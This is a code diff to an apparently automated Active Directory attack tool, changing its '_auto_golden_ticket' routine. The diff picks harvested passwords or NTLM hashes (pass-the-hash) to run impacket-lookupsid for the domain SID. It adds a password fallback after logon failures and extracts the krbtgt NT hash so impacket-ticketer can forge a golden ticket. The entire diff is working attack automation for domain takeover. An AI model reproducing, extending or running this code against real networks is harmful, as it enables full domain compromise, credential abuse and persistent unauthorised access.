@@ -3220,8 +3220,10 @@ async def _auto_golden_ticket(
                 )
 
                 # Need a credential or hash to run lookupsid
-                # Priority: same-domain password > same-domain hash > cross-domain password > cross-domain hash
-                # Cross-domain auth often fails for SID lookup, so prefer same-domain creds
+                # Priority: same-domain password > ANY password > same-domain hash > any hash
+                # Password credentials are more reliable than hashes because hash domains
+                # can be incorrectly assigned due to hostname/state sync race conditions.
+                # Cross-domain password auth works via trust relationships.
                 cred = None
                 auth_hash = None
 
@@ -3231,7 +3233,14 @@ async def _auto_golden_ticket(
                         cred = c
                         break
 
-                # 2. Try same-domain NTLM hash (PTH) - more reliable than cross-domain password
+                # 2. Try ANY password credential (cross-domain auth works via trust)
+                if not cred:
+                    for c in state.all_credentials:
+                        if c.password:
+                            cred = c
+                            break
+
+                # 3. Try same-domain NTLM hash (PTH) - less reliable, domain may be wrong
                 if not cred:
                     for h in state.all_hashes:
                         if h.hash_type.lower() != "ntlm":
@@ -3246,13 +3255,6 @@ async def _auto_golden_ticket(
                                 f"🎫 Auto-golden-ticket: Using same-domain hash for {domain}: "
                                 f"{h.domain}\\{h.username}"
                             )
-                            break
-
-                # 3. Try any password credential (cross-domain auth may work)
-                if not cred and not auth_hash:
-                    for c in state.all_credentials:
-                        if c.password:
-                            cred = c
                             break
 
                 # 4. Try any NTLM hash (cross-domain PTH as last resort)
@@ -3351,6 +3353,46 @@ async def _auto_golden_ticket(
 
                     # Parse domain SID from output
                     sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
+
+                    # If PTH failed with LOGON_FAILURE, try password credentials as fallback
+                    # This handles cases where hash is from wrong domain due to state sync issues
+                    if (
+                        not sid_match
+                        and "STATUS_LOGON_FAILURE" in output
+                        and auth_hash
+                        and not cred
+                    ):
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: PTH failed for {domain}, trying password fallback"
+                        )
+                        # Find any password credential (cross-domain auth via trust)
+                        for c in state.all_credentials:
+                            if c.password:
+                                cred = c
+                                break
+                        if cred:
+                            cmd = [
+                                "impacket-lookupsid",
+                                f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                            ]
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: Retrying lookupsid with password for "
+                                f"{cred.domain}\\{cred.username}"
+                            )
+                            try:
+                                stdout, stderr, _ = _run_lookupsid_with_retry(
+                                    cmd, timeout_seconds=60
+                                )
+                                output = stdout + "\n" + (stderr or "")
+                                output_preview = (
+                                    output[:300].replace("\n", "\\n") if output else "<empty>"
+                                )
+                                sid_match = re.search(
+                                    r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
+                                )
+                            except (TransientToolError, RetryError):
+                                pass  # Fall through to failure handling
+
                     if not sid_match:
                         # Lookupsid ran but couldn't extract SID - this is a permanent failure
                         # (bad creds, wrong domain, etc.)
@@ -3377,11 +3419,16 @@ async def _auto_golden_ticket(
                     logger.info(f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}")
 
                     # Generate golden ticket
+                    # Extract just the NT hash if in LM:NT format
+                    krbtgt_nt_hash = hash_obj.hash_value
+                    if ":" in krbtgt_nt_hash:
+                        krbtgt_nt_hash = krbtgt_nt_hash.split(":")[-1]
+
                     ticket_path = "Administrator.ccache"
                     cmd = [
                         "impacket-ticketer",
                         "-nthash",
-                        hash_obj.hash_value,
+                        krbtgt_nt_hash,
                         "-domain-sid",
                         domain_sid,
                         "-domain",
